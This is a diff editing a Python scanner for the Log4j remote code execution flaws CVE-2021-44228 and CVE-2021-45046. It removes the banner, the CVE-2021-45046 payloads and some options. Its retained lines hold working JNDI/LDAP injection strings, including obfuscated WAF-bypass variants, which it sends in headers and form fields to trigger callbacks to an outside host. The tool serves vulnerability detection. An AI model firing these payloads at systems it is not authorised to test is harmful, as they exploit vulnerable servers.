@@ -1,13 +1,3 @@
-#!/usr/bin/env python3
-# coding=utf-8
-# ******************************************************************
-# log4j-scan: A generic scanner for Apache log4j RCE CVE-2021-44228
-# Author:
-# Mazin Ahmed <Mazin at FullHunt.io>
-# Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
-# Secure your Attack Surface with FullHunt.io.
-# ******************************************************************
-
 import argparse
 import random
 import requests
@@ -23,7 +13,6 @@ from Crypto.PublicKey import RSA
 from Crypto.Hash import SHA256
 from termcolor import cprint
 
-
 # Disable SSL warnings
 try:
     import requests.packages.urllib3
@@ -31,15 +20,9 @@ try:
 except Exception:
     pass
 
-
-# cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
-# cprint('[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.', "yellow")
-# cprint('[•] Secure your External Attack Surface with FullHunt.io.', "yellow")
-
 if len(sys.argv) <= 1:
     print('\n%s -h for help.' % (sys.argv[0]))
     exit(0)
-
 
 default_headers = {
     #'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
@@ -75,12 +58,6 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}"
                        ]
 
-cve_2021_45046 = [
-                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}",  # Source: https://twitter.com/marcioalm/status/1471740771581652995,
-                  "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
-                  "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
-                 ]
-
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
                     dest="url",
@@ -89,10 +66,6 @@ parser.add_argument("-u", "--url",
 parser.add_argument("-p", "--proxy",
                     dest="proxy",
                     help="send requests through proxy",
-                    action='store')
-parser.add_argument("-l", "--list",
-                    dest="usedlist",
-                    help="Check a list of URLs.",
                     action='store')
 parser.add_argument("--request-type",
                     dest="request_type",
@@ -104,10 +77,6 @@ parser.add_argument("--headers-file",
                     help="Headers fuzzing list - [default: headers.txt].",
                     default="headers.txt",
                     action='store')
-parser.add_argument("--run-all-tests",
-                    dest="run_all_tests",
-                    help="Run all available tests on each URL.",
-                    action='store_true')
 parser.add_argument("--exclude-user-agent-fuzzing",
                     dest="exclude_user_agent_fuzzing",
                     help="Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.",
@@ -121,13 +90,6 @@ parser.add_argument("--wait-time",
 parser.add_argument("--waf-bypass",
                     dest="waf_bypass_payloads",
                     help="Extend scans with WAF bypass payloads.",
-                    action='store_true')
-parser.add_argument("--custom-waf-bypass-payload",
-                    dest="custom_waf_bypass_payload",
-                    help="Test with custom WAF bypass payload.")
-parser.add_argument("--test-CVE-2021-45046",
-                    dest="cve_2021_45046",
-                    help="Test using payloads for CVE-2021-45046 (detection payloads).",
                     action='store_true')
 parser.add_argument("--dns-callback-provider",
                     dest="dns_callback_provider",
@@ -145,15 +107,9 @@ parser.add_argument("--disable-http-redirects",
 
 args = parser.parse_args()
 
-
 proxies = {}
 if args.proxy:
     proxies = {"http": args.proxy, "https": args.proxy}
-
-
-if args.custom_waf_bypass_payload:
-    waf_bypass_payloads.append(args.custom_waf_bypass_payload)
-
 
 def get_fuzzing_headers(payload):
     fuzzing_headers = {}
@@ -171,13 +127,11 @@ def get_fuzzing_headers(payload):
         fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
     return fuzzing_headers
 
-
 def get_fuzzing_post_data(payload):
     fuzzing_post_data = {}
     for i in post_data_parameters:
         fuzzing_post_data.update({i: payload})
     return fuzzing_post_data
-
 
 def generate_waf_bypass_payloads(callback_host, random_string):
     payloads = []
@@ -186,16 +140,6 @@ def generate_waf_bypass_payloads(callback_host, random_string):
         new_payload = new_payload.replace("{{random}}", random_string)
         payloads.append(new_payload)
     return payloads
-
-
-def get_cve_2021_45046_payloads(callback_host, random_string):
-    payloads = []
-    for i in cve_2021_45046:
-        new_payload = i.replace("{{callback_host}}", callback_host)
-        new_payload = new_payload.replace("{{random}}", random_string)
-        payloads.append(new_payload)
-    return payloads
-
 
 class Interactsh:
     # Source: https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/interactsh/__init__.py
@@ -262,12 +206,10 @@ class Interactsh:
                          }
         return new_log_entry
 
-
 def parse_url(url):
     """
     Parses the URL.
     """
-
     # Url: https://example.com/login.jsp
     url = url.replace('#', '%23')
     url = url.replace(' ', '%20')
@@ -286,7 +228,6 @@ def parse_url(url):
             "host":  urlparse.urlparse(url).netloc.split(":")[0],
             "file_path": file_path})
 
-
 def scan_url(url, callback_host):
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
@@ -295,14 +236,10 @@ def scan_url(url, callback_host):
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
 
-    if args.cve_2021_45046:
-        cprint(f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)", "yellow")
-        payloads = get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
-
     for payload in payloads:
         cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
 
-        if args.request_type.upper() == "GET" or args.run_all_tests:
+        if args.request_type.upper() == "GET":
             try:
                 requests.request(url=url,
                                  method="GET",
@@ -315,7 +252,7 @@ def scan_url(url, callback_host):
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
 
-        if args.request_type.upper() == "POST" or args.run_all_tests:
+        if args.request_type.upper() == "POST" :
             try:
                 # Post body
                 requests.request(url=url,
@@ -344,18 +281,10 @@ def scan_url(url, callback_host):
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
 
-
 def main():
     urls = []
     if args.url:
         urls.append(args.url)
-    if args.usedlist:
-        with open(args.usedlist, "r") as f:
-            for i in f.readlines():
-                i = i.strip()
-                if i == "" or i.startswith("#"):
-                    continue
-                urls.append(i)
 
     dns_callback_host = ""
     if args.custom_dns_callback_host:
@@ -388,7 +317,6 @@ def main():
         cprint("[!!!] Targets Affected", "yellow")
         for i in records:
             cprint(json.dumps(i), "yellow")
-
 
 if __name__ == "__main__":
     try:
